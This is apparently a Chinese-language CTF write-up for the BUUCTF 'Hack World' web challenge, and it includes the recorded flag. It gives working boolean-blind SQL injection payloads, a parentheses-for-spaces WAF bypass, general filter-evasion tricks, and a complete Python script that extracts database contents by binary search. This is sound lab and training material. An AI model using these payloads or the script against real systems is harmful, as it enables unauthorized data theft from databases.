---
title: "[CISCN2019 华北赛区 Day2 Web1]Hack World"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [sqli, boolean-based-blind-sqli, waf-bypass, mysql]
vulnerability: SQL注入（布尔盲注），通过括号绕过空格过滤
solved: true
flag: "flag{78e7a372-d46c-422c-8ff8-8d6bd3d3954e}"
---

# [CISCN2019 华北赛区 Day2 Web1]Hack World

## 题目概述
题目是一个简单的表单页面，提示 flag 在 `flag` 表的 `flag` 列中，需要通过 POST 提交 id 参数查询。

## 信息收集
1. 访问页面，提示：`All You Want Is In Table 'flag' and the column is 'flag'`
2. 测试 `id=1` 返回正常数据：`Hello, glzjin wants a girlfriend.`
3. 测试 `id=1'` 返回 `bool(false)`，存在 SQL 注入
4. 测试 `id=1 or 1=1` 返回 `SQL Injection Checked.`，存在 WAF 过滤

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：SQL 注入（布尔盲注）

**过滤分析**：
- `union`、`and`、`or`、`information`、`insert`、`update`、`delete` 被过滤
- `select` 单独出现不过滤，但 `select 1`（带空格）被过滤
- `if()`、`substr()`、`ascii()`、`length()` 函数可用

**绕过方法**：
- 使用 `select(1)` 代替 `select 1`，用括号替代空格
- 完整 payload：`if((select(flag)from(flag)),1,0)`

**判断过程**：
1. 条件为真返回 `Hello, glzjin wants a girlfriend.`
2. 条件为假返回 `Error Occured When Fetch Result.`

## 利用过程（Payload + Flag）

**获取 flag 长度**：
```sql
if(length((select(flag)from(flag)))=42,1,0)
```
结果：长度为 42

**获取 flag 内容（二分查找）**：
```sql
if(ascii(substr((select(flag)from(flag)),1,1))>100,1,0)
```

**完整 exploit 脚本**：
```python
#!/usr/bin/env python3
import requests

url = "http://target/index.php"

def check(condition):
    payload = f"if({condition},1,0)"
    resp = requests.post(url, data={"id": payload})
    return "Hello" in resp.text

# 二分查找获取每个字符
for pos in range(1, 43):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        condition = f"ascii(substr((select(flag)from(flag)),{pos},1))>{mid}"
        if check(condition):
            low = mid + 1
        else:
            high = mid
    print(chr(low), end='')
```

**Flag**：`flag{78e7a372-d46c-422c-8ff8-8d6bd3d3954e}`

## 复现步骤
1. 访问题目页面，发现是 POST 型 id 参数查询
2. 测试注入点，发现存在 WAF 过滤
3. 分析过滤规则，发现 `select ` 被过滤但 `select()` 可用
4. 构造布尔盲注 payload：`if((select(flag)from(flag)),1,0)`
5. 使用二分查找逐字符提取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 项目 | 内容 |
|------|------|
| 漏洞类型 | SQL 注入（布尔盲注） |
| 攻击入口 | POST 参数 `id` |
| 核心 Payload | `if(ascii(substr((select(flag)from(flag)),{pos},1))>{mid},1,0)` |
| 绕过技巧 | 用括号替代空格：`select(1)` 代替 `select 1` |
| 知识点 | 布尔盲注、WAF 绕过、二分查找优化 |

## 知识总结（解题技巧、同类题型套路）

1. **布尔盲注识别**：当 union/报错注入不可用时，观察页面不同响应判断条件真假
2. **WAF 绕过思路**：
   - 测试哪些关键字/函数被过滤
   - 尝试括号替代空格：`select(1)`、`from(table)`
   - 尝试大小写混合、双写、注释等
3. **二分查找优化**：逐字符盲注时，用二分查找将 95 次请求优化到 7 次
4. **常用函数**：`if()`、`substr()`、`ascii()`、`length()` 是盲注核心函数
